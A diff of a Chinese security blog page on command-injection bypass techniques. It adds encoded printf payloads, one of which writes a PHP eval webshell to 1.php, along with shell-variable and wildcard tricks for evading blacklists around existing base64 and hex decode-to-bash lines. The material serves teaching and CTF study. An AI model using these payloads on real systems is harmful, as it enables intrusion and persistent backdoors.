@@ -108,7 +108,7 @@
 <meta property="og:image" content="https://songxpu.github.io/2019/08/27/命令执行漏洞总结/burpsuite.jpg">
 <meta property="og:image" content="https://songxpu.github.io/2019/08/27/命令执行漏洞总结/phpinfo.jpg">
 <meta property="og:image" content="https://songxpu.github.io/2019/08/27/命令执行漏洞总结/逃逸.jpg">
-<meta property="og:updated_time" content="2019-08-27T13:58:08.608Z">
+<meta property="og:updated_time" content="2019-09-17T10:36:49.463Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="命令执行漏洞总结">
 <meta name="twitter:description" content="前言最近突然想到过去遇到命令执行漏洞时无法正常写文件，权限设置为777页无济于事，同时发现过去的笔记中有关命令执行漏洞的总结较少，因此这里重新总结一次。 关于无法写文件：将当前web目录的文件所有者更改为apache：chown apache:apache html即可">
@@ -308,7 +308,7 @@
       
     
 
-    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档<span class="badge">13</span></a>
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档<span class="badge">15</span></a>
 
   </li>
 
@@ -432,12 +432,24 @@
                 
               
 
-              <time title="创建时间：2019-08-27 22:00:03 / 修改时间：21:58:08" itemprop="dateCreated datePublished" datetime="2019-08-27T22:00:03+08:00">2019-08-27</time>
+              <time title="创建时间：2019-08-27 22:00:03" itemprop="dateCreated datePublished" datetime="2019-08-27T22:00:03+08:00">2019-08-27</time>
             
 
             
               
 
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-09-17 18:36:49" itemprop="dateModified" datetime="2019-09-17T18:36:49+08:00">2019-09-17</time>
               
             
           </span>
@@ -490,7 +502,7 @@
                 
                   <span class="post-meta-item-text">本文字数：</span>
                 
-                <span title="本文字数">2.9k</span>
+                <span title="本文字数">3.5k</span>
               
 
               
@@ -619,11 +631,59 @@
 
 <h4 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo Y2F0IDEudHh0|base64 -d|bash</span><br><span class="line"><span class="meta">#</span><span class="bash">cat 1.txt</span></span><br></pre></td></tr></table></figure>
 
-<h4 id="十六进制编码"><a href="#十六进制编码" class="headerlink" title="十六进制编码"></a>十六进制编码</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">编码</span></span><br><span class="line">echo "cat 1.txt"|xxd -p</span><br><span class="line"><span class="meta">#</span><span class="bash">解码</span></span><br><span class="line">echo "63617420312e7478740a"|xxd -r -p |bash</span><br></pre></td></tr></table></figure>
+<h4 id="十六进制编码"><a href="#十六进制编码" class="headerlink" title="十六进制编码"></a>十六进制编码</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">编码</span></span><br><span class="line">echo "cat 1.txt"|xxd -p</span><br><span class="line"><span class="meta">#</span><span class="bash">解码</span></span><br><span class="line">echo "63617420312e7478740a"|xxd -r -p |bash</span><br><span class="line"><span class="meta">#</span><span class="bash">其他</span></span><br><span class="line"><span class="meta">$</span><span class="bash">(<span class="built_in">printf</span> <span class="string">"\154\163"</span>) ==&gt;ls</span></span><br><span class="line"><span class="meta">$</span><span class="bash">(<span class="built_in">printf</span> <span class="string">"\x63\x61\x74\x20\x66\x6c\x61\x67"</span>) ==&gt;cat flag</span></span><br><span class="line">&#123;printf,"\x63\x61\x74\x20\x66\x6c\x61\x67"&#125;|$0 ==&gt;cat /flag</span><br><span class="line"><span class="meta">#</span><span class="bash">可以通过这样来写webshell,内容为&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">'c'</span>]);?&gt;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;<span class="built_in">printf</span>,<span class="string">"\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76"</span>&#125; &gt;&gt; 1.php</span></span><br></pre></td></tr></table></figure>
 
 <h4 id="单、双引号"><a href="#单、双引号" class="headerlink" title="单、双引号"></a>单、双引号</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ca""t fla''g</span><br></pre></td></tr></table></figure>
 
 <h4 id="反斜线"><a href="#反斜线" class="headerlink" title="反斜线"></a>反斜线</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c\a\t f\l\a\g</span><br></pre></td></tr></table></figure>
+
+<h4 id="利用Shell-特殊变量绕过"><a href="#利用Shell-特殊变量绕过" class="headerlink" title="利用Shell 特殊变量绕过"></a>利用Shell 特殊变量绕过</h4><table>
+<thead>
+<tr>
+<th>变量</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>$0</td>
+<td>当前脚本的文件名</td>
+</tr>
+<tr>
+<td>$n</td>
+<td>传递给脚本或函数的参数。n 是一个数字，表示第几个参数。例如，第一个参数是1，第二个参数是2。而参数不存在时其值为空。</td>
+</tr>
+</tbody></table>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">ca$</span><span class="bash">@t fla<span class="variable">$@g</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">cat flag</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h4><table>
+<thead>
+<tr>
+<th>字符</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>*</td>
+<td>匹配任意长度任意字符</td>
+</tr>
+<tr>
+<td>？</td>
+<td>匹配任意单个字符</td>
+</tr>
+<tr>
+<td>[list]</td>
+<td>匹配指定范围内(list)任意单个字符，也可以是单个字符组成的集合</td>
+</tr>
+<tr>
+<td>{str1,str2}</td>
+<td>匹配str1或者str2字符，也可以是集合</td>
+</tr>
+<tr>
+<td>[^list]</td>
+<td>匹配指定范围外的任意单个字符或字符集合</td>
+</tr>
+</tbody></table>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat fl*</span><br><span class="line">cat fla?</span><br></pre></td></tr></table></figure>
 
 <h3 id="无回显的命令执行"><a href="#无回显的命令执行" class="headerlink" title="无回显的命令执行"></a>无回显的命令执行</h3><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><blockquote>
 <p>此处列举的反弹shell存在局限性，一些环境下无法正常使用，之后重新总结一下反弹shell</p>
@@ -824,7 +884,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">13</span>
+                    <span class="site-state-item-count">15</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -924,7 +984,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#命令执行漏洞"><span class="nav-number">2.</span> <span class="nav-text">命令执行漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#命令执行几种方式"><span class="nav-number">2.1.</span> <span class="nav-text">命令执行几种方式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#命令执行绕过技巧"><span class="nav-number">3.</span> <span class="nav-text">命令执行绕过技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#空格绕过"><span class="nav-number">3.1.</span> <span class="nav-text">空格绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#命令连接符"><span class="nav-number">3.2.</span> <span class="nav-text">命令连接符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#黑名单绕过"><span class="nav-number">3.3.</span> <span class="nav-text">黑名单绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#变量拼接"><span class="nav-number">3.3.1.</span> <span class="nav-text">变量拼接</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#base64编码"><span class="nav-number">3.3.2.</span> <span class="nav-text">base64编码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#十六进制编码"><span class="nav-number">3.3.3.</span> <span class="nav-text">十六进制编码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#单、双引号"><span class="nav-number">3.3.4.</span> <span class="nav-text">单、双引号</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#反斜线"><span class="nav-number">3.3.5.</span> <span class="nav-text">反斜线</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#无回显的命令执行"><span class="nav-number">3.4.</span> <span class="nav-text">无回显的命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#反弹shell"><span class="nav-number">3.4.1.</span> <span class="nav-text">反弹shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DNSLOG"><span class="nav-number">3.4.2.</span> <span class="nav-text">DNSLOG</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#curl上传文件"><span class="nav-number">3.4.3.</span> <span class="nav-text">curl上传文件</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#短命令执行"><span class="nav-number">3.5.</span> <span class="nav-text">短命令执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IP绕过"><span class="nav-number">3.6.</span> <span class="nav-text">IP绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞防范"><span class="nav-number">4.</span> <span class="nav-text">漏洞防范</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#命令防注入函数"><span class="nav-number">4.1.</span> <span class="nav-text">命令防注入函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参数白名单"><span class="nav-number">4.2.</span> <span class="nav-text">参数白名单</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考文章"><span class="nav-number">5.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#命令执行漏洞"><span class="nav-number">2.</span> <span class="nav-text">命令执行漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#命令执行几种方式"><span class="nav-number">2.1.</span> <span class="nav-text">命令执行几种方式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#命令执行绕过技巧"><span class="nav-number">3.</span> <span class="nav-text">命令执行绕过技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#空格绕过"><span class="nav-number">3.1.</span> <span class="nav-text">空格绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#命令连接符"><span class="nav-number">3.2.</span> <span class="nav-text">命令连接符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#黑名单绕过"><span class="nav-number">3.3.</span> <span class="nav-text">黑名单绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#变量拼接"><span class="nav-number">3.3.1.</span> <span class="nav-text">变量拼接</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#base64编码"><span class="nav-number">3.3.2.</span> <span class="nav-text">base64编码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#十六进制编码"><span class="nav-number">3.3.3.</span> <span class="nav-text">十六进制编码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#单、双引号"><span class="nav-number">3.3.4.</span> <span class="nav-text">单、双引号</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#反斜线"><span class="nav-number">3.3.5.</span> <span class="nav-text">反斜线</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用Shell-特殊变量绕过"><span class="nav-number">3.3.6.</span> <span class="nav-text">利用Shell 特殊变量绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#通配符绕过"><span class="nav-number">3.3.7.</span> <span class="nav-text">通配符绕过</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#无回显的命令执行"><span class="nav-number">3.4.</span> <span class="nav-text">无回显的命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#反弹shell"><span class="nav-number">3.4.1.</span> <span class="nav-text">反弹shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DNSLOG"><span class="nav-number">3.4.2.</span> <span class="nav-text">DNSLOG</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#curl上传文件"><span class="nav-number">3.4.3.</span> <span class="nav-text">curl上传文件</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#短命令执行"><span class="nav-number">3.5.</span> <span class="nav-text">短命令执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IP绕过"><span class="nav-number">3.6.</span> <span class="nav-text">IP绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞防范"><span class="nav-number">4.</span> <span class="nav-text">漏洞防范</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#命令防注入函数"><span class="nav-number">4.1.</span> <span class="nav-text">命令防注入函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参数白名单"><span class="nav-number">4.2.</span> <span class="nav-text">参数白名单</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考文章"><span class="nav-number">5.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
             
 
           </div>
@@ -959,7 +1019,7 @@
     
       <span class="post-meta-item-text">站点总字数：</span>
     
-    <span title="站点总字数">58k</span>
+    <span title="站点总字数">76k</span>
   
 
   
@@ -970,7 +1030,7 @@
     
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
     
-    <span title="站点阅读时长">53 分钟</span>
+    <span title="站点阅读时长">1:09</span>
   
 </div>
 
